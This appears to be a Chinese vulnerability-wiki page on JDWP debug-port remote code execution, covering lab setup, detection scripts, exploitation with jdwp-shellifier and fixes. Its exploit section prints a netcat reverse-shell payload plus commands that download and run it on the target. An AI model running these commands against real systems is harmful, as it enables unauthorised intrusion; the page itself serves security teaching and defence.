@@ -1,0 +1,226 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="内部使用">
+    <link rel="canonical" href="https://secnn.com/%E5%BC%80%E5%8F%91%E8%AF%AD%E8%A8%80%E6%BC%8F%E6%B4%9E/JDWP%20%E8%B0%83%E8%AF%95%E6%8E%A5%E5%8F%A3%20RCE%20%E6%BC%8F%E6%B4%9E/">
+    <link rel="shortcut icon" href="../../favicon.ico">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>JDWP 调试接口 RCE 漏洞 - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
+    <link href="../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "JDWP \u8c03\u8bd5\u63a5\u53e3 RCE \u6f0f\u6d1e", url: "#_top", children: [
+              {title: "\u6f0f\u6d1e\u63cf\u8ff0", url: "#_1" },
+              {title: "\u73af\u5883\u642d\u5efa", url: "#_2" },
+              {title: "\u6f0f\u6d1e\u68c0\u6d4b", url: "#_3" },
+              {title: "\u6f0f\u6d1e POC", url: "#poc" },
+              {title: "\u4fee\u590d\u5efa\u8bae", url: "#_4" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../js/base.js"></script>
+      <script src="../../search/main.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../Java%20RMI%20Registry%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%28%3Djdk8u111%29/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../Java%20RMI%20Registry%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%28%3Djdk8u111%29/" class="btn btn-xs btn-link">
+        Java RMI Registry 反序列化漏洞 (&lt;=jdk8u111)
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../../%E5%BC%80%E5%8F%91%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/jQuery%20XSS%E6%BC%8F%E6%B4%9E%20CVE-2020-11022%2011023/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../../%E5%BC%80%E5%8F%91%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/jQuery%20XSS%E6%BC%8F%E6%B4%9E%20CVE-2020-11022%2011023/" class="btn btn-xs btn-link">
+        jQuery XSS 漏洞 CVE-2020-11022 11023
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="jdwp-rce">JDWP 调试接口 RCE 漏洞<a class="headerlink" href="#jdwp-rce" title="Permanent link">&para;</a></h1>
+<h2 id="_1">漏洞描述<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
+<p>JDWP（Java Debug Wire Protocol，Java 调试线协议）是一个为 Java 调试而设计的通讯交互协议，它定义了调试器（Debugger）和被调试 JVM（Debuggee）进程之间的交互数据的传递格式，它详细完整地定义了请求命令、回应数据和错误代码，保证了调试端和被调试端之间通信通畅。</p>
+<p>JDWP 是 JVM 或者类 JVM 的虚拟机都支持的一种协议，通过该协议，Debugger 端和被调试 JVM 之间进行通信，可以获取被调试 JVM 的包括类、对象、线程等信息。</p>
+<p>参考阅读：</p>
+<ul>
+<li><a href="https://forum.butian.net/share/1232">https://forum.butian.net/share/1232</a></li>
+</ul>
+<h2 id="_2">环境搭建<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
+<h3 id="windows">Windows<a class="headerlink" href="#windows" title="Permanent link">&para;</a></h3>
+<p>下载 Tomcat 到本地，在 <code>bin\startup.bat</code> 文件中添加如下代码开启 debug 模式：</p>
+<div class="highlight"><pre><span></span><code>SET CATALINA_OPTS=-server -Xdebug -Xnoagent -Djava.compiler=NONE -Xrunjdwp:transport=dt_socket,server=y,suspend=n,address=8000
+</code></pre></div>
+<p>点击运行 <code>startup.bat</code> ，以 debug 模式启动 Tomcat。</p>
+<p><code>Listening for transport dt_socket at address: 8000</code>，表示 JDWP 服务已经监听在 8000 端口，等待调试器连接。</p>
+<h3 id="linux">Linux<a class="headerlink" href="#linux" title="Permanent link">&para;</a></h3>
+<p>执行如下命令安装 Tomcat：</p>
+<div class="highlight"><pre><span></span><code># 执行wget命令下载Tomcat安装包
+wget http://mirror.bit.edu.cn/apache/tomcat/tomcat-8/v8.5.43/bin/apache-tomcat-8.5.43.tar.gz
+
+# 解压安装包
+tar zxvf apache-tomcat-8.5.43.tar.gz
+
+# 将程序安装包复制到指定运行目录下
+sudo mv apache-tomcat-8.5.43 /usr/local/tomcat8
+</code></pre></div>
+<p>启动方式一：</p>
+<p>进入 Tomcat 安装目录下的 bin 目录下找到 <code>catalina.sh</code> 文件，在文件开头部分添加如下一行：</p>
+<div class="highlight"><pre><span></span><code><span class="nv">CATALINA_OPTS</span><span class="o">=</span><span class="s2">&quot;-Xdebug -Xrunjdwp:transport=dt_socket,server=y,suspend=n,address=*:8000&quot;</span>
+</code></pre></div>
+<p>修改完成后，执行脚本 <code>./startup.sh</code> 就会以 debug 模式启动 Tomcat。</p>
+<p>启动方式二：</p>
+<p>进入 Tomcat 的 bin 目录，输入 <code>./catalina.sh jpda run</code> 或者 <code>./catalina.sh jpda start</code> 命令以调试模式启动 tomcat。</p>
+<p>启动时就会出现如下信息提示：</p>
+<p><code>Listening for transport dt_socket at address: 8000</code>。</p>
+<p>注意脚本中默认配置 JDWP 是监听在本地的 8000 端口，修改 <code>JDPA_ADDRESS</code> 的值对外开放此端口，在 JDK9 及以上的版本需要修改为 <code>JDPA_ADDRESS=*:8000</code> ，在 JDK9 以下版本修改为 <code>JDPA_ADDRESS=8000</code> 即可</p>
+<h2 id="_3">漏洞检测<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h2>
+<p>有三种常用方式来进行 JDWP 服务探测，原理都是一样的，即向目标端口连接后发送 JDWP-Handshake，如果目标服务直接返回一样的内容则说明是 JDWP 服务。</p>
+<h3 id="nmap">Nmap<a class="headerlink" href="#nmap" title="Permanent link">&para;</a></h3>
+<p>扫描会识别到 JDWP 服务，且有对应的 JDK 版本信息。</p>
+<div class="highlight"><pre><span></span><code>nmap<span class="w"> </span>-sT<span class="w"> </span>-sV<span class="w"> </span><span class="m">192</span>.168.192.1<span class="w"> </span>-p<span class="w"> </span><span class="m">8000</span>
+</code></pre></div>
+<h3 id="telnet">Telnet<a class="headerlink" href="#telnet" title="Permanent link">&para;</a></h3>
+<p>使用 Telnet 命令探测，需要马上输入 JDWP-Handshake，然后服务端返回一样的内容，证明是 JDWP 服务。</p>
+<div class="highlight"><pre><span></span><code>telnet<span class="w"> </span><span class="m">192</span>.168.182.130<span class="w"> </span><span class="m">8000</span>
+</code></pre></div>
+<p>注意：需要马上输入 JDWP-Handshake，并按下回车，不然马上就会断开。在 Linux 系统下使用 telnet 测试可以，在 Windows 系统下使用 telnet 测试不太行。</p>
+<h3 id="python">Python<a class="headerlink" href="#python" title="Permanent link">&para;</a></h3>
+<p>使用如下脚本扫描，直接连接目标服务器，并向目标发送 JDWP-Handshake，如果能接收到相同内容则说明目标是开启了 JDWP 服务。</p>
+<div class="highlight"><pre><span></span><code>import socket
+
+host = &quot;192.168.182.130&quot;
+port = 8000
+try:
+    client = socket.socket()
+    client.connect((host, port))
+    client.send(b&quot;JDWP-Handshake&quot;)
+    if client.recv(1024) == b&quot;JDWP-Handshake&quot;:
+        print(&quot;[*] {}:{} Listening JDWP Service! &quot;.format(host, port))
+except Exception as e:
+    print(&quot;[-] Connection failed! &quot;)
+finally:
+    client.close()
+</code></pre></div>
+<h2 id="poc">漏洞 POC<a class="headerlink" href="#poc" title="Permanent link">&para;</a></h2>
+<h3 id="poc1">POC1<a class="headerlink" href="#poc1" title="Permanent link">&para;</a></h3>
+<p>poc1：<a href="https://github.com/IOActive/jdwp-shellifier">https://github.com/IOActive/jdwp-shellifier</a></p>
+<p>jdwp-shellifier 是使用 Python2 编写的，该工具通过编写了一个 JDI（JDWP 客户端），以下断点的方式来获取线程上下文从而调用方法执行命令。</p>
+<p>该漏洞无回显，可利用 dnslog 进行探测：</p>
+<div class="highlight"><pre><span></span><code>python2 jdwp-shellifier.py -t 192.168.3.118 -p 8787 --break-on &quot;java.lang.String.indexof&quot; --cmd &quot;ping xxx.dnslog.cn&quot;
+</code></pre></div>
+<h4 id="shell">反弹 shell<a class="headerlink" href="#shell" title="Permanent link">&para;</a></h4>
+<p>准备反弹 shell 文件，保存为 shell.txt：</p>
+<div class="highlight"><pre><span></span><code>nc 192.168.178.129 3333 | /bin/bash | nc 192.168.178.129 4444%
+</code></pre></div>
+<p>启动 http 服务：</p>
+<div class="highlight"><pre><span></span><code>python3 -m http.server 8000
+</code></pre></div>
+<p>开启监听，需要开启 2 个监听，前面一个输入执行命令，后面一个输出命令执行结果：</p>
+<div class="highlight"><pre><span></span><code>nc -lvvp 3333
+nc -lvvp 4444
+</code></pre></div>
+<p>利用 poc1 执行命令，下载 shell、文件可执行权限、执行 shell：</p>
+<div class="highlight"><pre><span></span><code>python2 jdwp-shellifier.py -t 192.168.178.128 -p 8000 --break-on &quot;java.lang.String.indexof&quot; --cmd &quot;wget http://192.168.178.129:8000/shell.txt -O /tmp/shell.sh&quot;
+python2 jdwp-shellifier.py -t 192.168.178.128 -p 8000 --break-on &quot;java.lang.String.indexof&quot; --cmd &quot;chmod a+x /tmp/shell.sh&quot;
+python2 jdwp-shellifier.py -t 192.168.178.128 -p 8000 --break-on &quot;java.lang.String.indexof&quot; --cmd &quot;/tmp/shell.sh&quot;
+</code></pre></div>
+<p>两个监听都收到 shell，一个输入命令，一个输出结果。</p>
+<p><img alt="image-20230630173638801" src="../images/image-20230630173638801.png" /></p>
+<h3 id="poc2">POC2<a class="headerlink" href="#poc2" title="Permanent link">&para;</a></h3>
+<p>poc2：<a href="https://github.com/Lz1y/jdwp-shellifier">https://github.com/Lz1y/jdwp-shellifier</a></p>
+<p>该脚本是在上面一个漏洞利用脚本的基础上，修改利用方式为通过对 Sleeping 的线程发送单步执行事件，达成断点，从而可以直接获取上下文、执行命令，而不用等待断点被击中。</p>
+<h2 id="_4">修复建议<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h2>
+<ul>
+<li>关闭 JDWP 端口，或者 JDWP 端口不对公网开放</li>
+<li>关闭 Java 的 debug 模式</li>
+</ul>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../Java%20RMI%20Registry%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%28%3Djdk8u111%29/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../Java%20RMI%20Registry%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%28%3Djdk8u111%29/" class="btn btn-xs btn-link">
+        Java RMI Registry 反序列化漏洞 (&lt;=jdk8u111)
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../../%E5%BC%80%E5%8F%91%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/jQuery%20XSS%E6%BC%8F%E6%B4%9E%20CVE-2020-11022%2011023/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../../%E5%BC%80%E5%8F%91%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/jQuery%20XSS%E6%BC%8F%E6%B4%9E%20CVE-2020-11022%2011023/" class="btn btn-xs btn-link">
+        jQuery XSS 漏洞 CVE-2020-11022 11023
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
+</footer>
+
+</body>
+</html>
